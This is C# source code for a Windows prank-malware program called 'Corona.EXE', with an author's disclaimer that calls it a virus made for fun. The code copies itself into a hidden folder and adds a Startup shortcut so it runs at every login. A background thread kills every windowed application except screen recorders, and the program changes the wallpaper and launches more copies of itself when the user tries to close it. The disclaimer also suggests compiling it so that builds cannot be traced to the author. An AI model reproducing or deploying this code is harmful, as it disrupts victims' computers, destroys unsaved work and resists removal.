using System;
using System.Threading;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Windows;
using System.Reflection;
using IWshRuntimeLibrary;
/*
 
                ██████╗ ██████╗ ██████╗  ██████╗ ███╗    ██╗ █████╗    ███████╗██╗  ██╗███████╗
                ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗████╗  ██║██╔══██╗   ██╔════╝╚██╗██╔╝██╔════╝
                ██║     ██║   ██║██████╔╝██║   ██║██╔██╗ ██║███████║   █████╗   ╚███╔╝ █████╗  
                ██║     ██║   ██║██╔══██╗██║   ██║██║╚██╗██║██╔══██║   ██╔══╝   ██╔██╗ ██╔══╝  
                ╚██████╗╚██████╔╝██║  ██║╚██████╔╝██║ ╚████║██║  ██║██╗███████╗██╔╝ ██╗███████╗

  -=========================================================================================================-
    * Author : Zenix-Owler 

    * Github : https://github.com/Zenix-Owler

    * Disclaimer : I only make this virus for fun, i do not encourage anyone to publish or spread it out for malicious purposes,
    That's why i don't publish the compiled executable but the source codes instead, if one wish to try it out, compile it through
    Visual studio so the executables won't have tracks of me like time and date that it was created and so on, hence it'll be the 
    proof if anyone is intending to abuse it to cause chaos but not me. Therefore, i won't be responsible for any action of yours.
           
        - Copyright © 2020 Hackernese -

  -=========================================================================================================-
 */

namespace Corona.EXE
{
    public partial class Form1 : Form
    {

        //------------ Global variables go here ------------//
        System.Random random = new System.Random();                                      // set up a randomizer
        string curlocation = System.Reflection.Assembly.GetExecutingAssembly().Location; // The location of the executable
        string[] MessageTotal = {                                                        // Messages for screwing around with the users
            "Here come another one... :}}",
            "F*ck you for trying to shut me down, here come another one.",
            "Gotcha ! ( ͡° ͜ʖ ͡°)",
            "The world will be mine. but for now, i don't feel so good.",
            "你好... 娘 !!! ",
            "AAAhhh CCHhoooo.. **Sniff**",
            "Am i a chinese ? HHHmmm...",
            "ZZZZzzzzz, wait wut... you will pay for waking me up >:{",
            "Funny thing, the guy who made me is a Vietnamese even tho this program is very chinese. ",
            "Who the hell said i'm a Vietnamese ??? Tụi nó xàm loz vãi... :}"
        }, Arguments = Environment.GetCommandLineArgs(), wallpapers = {
                "wallpaper1.jpg",
                "wallpaper2.jpg",
                "wallpaper3.jpg"
        };                                                                               // Extracting command-line arguments
        int crossline = 0;                                                               // Total of clicks recieved from the users in order to go crazy 
        Thread Randfixer, ProcHandler;                                                   // Threading Objects
        //------------ Global variables go here ------------//

        private void HandleProcesses()                               // Handle every other process to see WHAT we should do with them >:)
        {
            string proc;                                             // use to be assigned to with the process name
            Process[] processCollection;                             // an array to store later processes information
            WindowsIdentity identity = WindowsIdentity.GetCurrent(); // Get current user privilege set
            
            while (true)
            {
                processCollection = Process.GetProcesses();
                foreach (Process p in processCollection)
                {
                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
                    {
                        proc = p.ProcessName.ToString().ToLower();
                        string[] RecordingProcesses = {
                            "obs64","sharex","freecam",
                            "ezvid","recorder","wondershare filmora9",
                            "camtasiastudio" 
                        };
                       
                        if (
                                !Array.Exists(RecordingProcesses, element => element == proc) &&
                                !((proc.StartsWith("corona.exe") || proc.StartsWith("coronaexe")))
                            )                                                                    // Kill every process that isn't identical but spare the Screen-recording ones
                        {
                            try { p.Kill(); }                                                    // Killing the process
                            catch { }
                        }
                    }
                }
                Thread.Sleep(1000);                                                              // 1 second just might be enough
            }
        }

        private void SwitchWallpaper(string ImageCoroPath) // Upadting the Wallpaper
        {
            const int
                SET_DESKTOP_BACKGROUND = 20,
                UPDATE_INI_FILE = 1,
                SEND_WINDOWS_INI_CHANGE = 2
            ;
            win32.SystemParametersInfo(
                SET_DESKTOP_BACKGROUND,
                0,
                ImageCoroPath,
                UPDATE_INI_FILE | SEND_WINDOWS_INI_CHANGE
            );
        }

        internal sealed class win32                           // Loading outer library
        {
            [DllImport("user32.dll", CharSet = CharSet.Auto)] // Loading the user32.dll into memory
            internal static extern int SystemParametersInfo(  // Setting information for wallpaper
                int uAction, 
                int uParam, 
                String lpvParam, 
                int fuWinIni
            ); 
        }

        private static void ExtractImageWallPaper(string nameSpace, string outDir, string SourcePath) // Extracting the binary data of wallpapers out of itself 
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + SourcePath))
            {
                using(BinaryReader r = new BinaryReader(s))
                {
                    using(FileStream fsfile = new FileStream(outDir + "\\" + SourcePath, FileMode.OpenOrCreate))
                    {
                        using(BinaryWriter wobj = new BinaryWriter(fsfile))
                        {
                            wobj.Write(r.ReadBytes((int)s.Length));
                        }
                    }
                }
            }
        }

        private void RandomPosition() // Fixing the positions of the form randomly everytime
        {
            int
                _ScreenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width,
                _ScreenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height
            ;
            var Fromfr = new Form1();
            int
                x = random.Next(_ScreenWidth - Fromfr.Width),   // range [0 .. screen width - form width].
                y = random.Next(_ScreenHeight - Fromfr.Height)  // range [0 .. screen height - form height].
            ;
            this.Invoke((MethodInvoker)delegate {
                this.Location = new Point(x, y);
            }
            );

        }

        private void AshooExec()   // Opening up a random set of self-executable, range from 2-6
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + curlocation + " 2020";
            process.StartInfo = startInfo;
            process.Start();
        }

        private void PositionFixer() // Randomly fixing its position every few seconds
        {
            while (true)
            {
                Thread.Sleep(random.Next(900, 3001));
                RandomPosition();
            }
        }

        private void label1_MouseHover(object sender, EventArgs e)
        {
            label1.ForeColor = System.Drawing.Color.Red;
        }

        private void label1_MouseLeave(object sender, EventArgs e)
        {
            label1.ForeColor = System.Drawing.Color.Black;
        }

        public static void CreateShortcut(string targetFileLocation, string shortcutPath) // Creating shortcuts for startup
        {
            string shortcutLocation = System.IO.Path.Combine(shortcutPath, "coroexe" + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);
            shortcut.TargetPath = targetFileLocation;           // The path of the file that will launch when the shortcut is run
            shortcut.Save();                                    // Save the shortcut
        }

        private void Form1_Load(object sender, EventArgs e)                               // Beginning loading the form
        {
            string userprofile = Environment.GetEnvironmentVariable("USERPROFILE"), waller = wallpapers[random.Next(0, 3)], tempo;
            userprofile = userprofile + "\\Start Menu\\Programs\\Startup";
            tempo = "C:\\corodir";

            if (curlocation.StartsWith(userprofile)) // Checking if it's a startup process
            {
                curlocation = tempo + "\\CoronaEXE.exe";
            }

            if (Arguments.Length > 1)                // Clicked by user 
            {
                if (Arguments[1] == "2020")
                {
                    RandomPosition();
                }
            }
            else                                      // Executed by itself
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (!Directory.Exists(tempo))
                {

                    Directory.CreateDirectory(tempo); // Create an initial folder

                    // ------------------------- Hiding the initial folder ------------------------- //
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = "/C attrib +h " + tempo;
                    process.StartInfo = startInfo;
                    process.Start();
                    // ------------------------- Hiding the initial folder ------------------------- // 

                    System.IO.File.Copy(curlocation, tempo+"\\CoronaEXE.exe", true);          // Duplicating itself a bit*/
                    CreateShortcut(tempo + "\\CoronaEXE.exe", userprofile );                  // Create the shortcut

                    // ------------------------- Executing the main file ------------------------- //
                    startInfo.Arguments = "/C " + tempo + "\\CoronaEXE.exe";
                    process.StartInfo = startInfo;
                    process.Start();
                    // ------------------------- Executing the main file ------------------------- //

                    crossline += 1;
                    this.Close();

                }

                ExtractImageWallPaper("Corona.EXE", "C:\\Users\\Public", waller);             // Creating the wallpaper a bit here

                Thread StartTh = new Thread(                                                  // Creating a thread to show some messages
                    unused => MessageBox.Show(
                        "WHOOPS !!! Gotcha... now you're dead  >:}",
                        "Corona.EXE",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    )
                );
                if(crossline!=0)
                    StartTh.Start();                                      // Starting the threa 
                Thread.Sleep(3000);                                   // Wait for awhile just yet...
                SwitchWallpaper("C:\\Users\\Public\\" + waller);      // Change the wallpaper here
            }

            Randfixer = new Thread(PositionFixer);                    // Responsible for automating the random positions of itself
            Randfixer.Start();
            ProcHandler = new Thread(HandleProcesses);                // Responsible for handling outer processes and kill them if needed
            ProcHandler.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e) // What happens once you close the form
        {
            if (crossline == 0)                                              // If it is closed by the closing button 
            {

                foreach (int i in Enumerable.Range(3, random.Next(4, 11)))
                {
                    AshooExec();
                }
                Thread.Sleep(300);
                Thread _StartThClose_ = new Thread(                          // Creating a thread to show some messages
                    unused => MessageBox.Show(
                        MessageTotal[random.Next(0, 10)],
                        "Corona.EXE",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Information
                    )
                );
                _StartThClose_.Start();

            }
            if ( Randfixer!=null)
            {
                if (Randfixer.IsAlive)
                {
                    Randfixer.Abort();   // Abort the mission when everything comes to an end
                }
            }
            if( ProcHandler!=null)
            {
                if ( ProcHandler.IsAlive)
                {
                    ProcHandler.Abort(); // Well, abort it again until we all go extinct one day :}
                }
            }   
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e) // What happens if the user is a piece of shit >:} s
        {
            if (crossline == 0)     // first alarm
            {
                MessageBox.Show("No no, don't do that ;)", "Corona.EXE", MessageBoxButtons.OK, MessageBoxIcon.Information);
                crossline += 1;
            }
            else if (crossline == 1) // second alarm if the user is stupid enough
            {
                MessageBox.Show("Hey !!! STOP IT.", "Corona.EXE", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                crossline += 1;
            }
            else if (crossline == 2) // well just another alarm :}
            {
                MessageBox.Show("I'm warning ya, try that one more time and things won't end well for ya .-.", "Corona.EXE", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                crossline += 1;
            }
            else if (crossline == 3) // Well fuck it then... 
            {
                MessageBox.Show("Don't say i didn't warn you !", "Corona.EXE", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                crossline += 1;
            }
            else                      // Wrecking some nasty shits here
            {
                foreach (int i in Enumerable.Range(10, random.Next(10, 21)))
                {
                    AshooExec();               // Popping some chaos
                }
                Thread showmes = new Thread(   // Creating a thread to show some messages
                    unused => MessageBox.Show(
                        "AAAaaa-CCHHHOOO !!!      >:)",
                        "Corona.EXE",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    )
                );
                showmes.Start();       // Starting the thread
                this.Close();          // Closing the form

            }
        }
    }
}
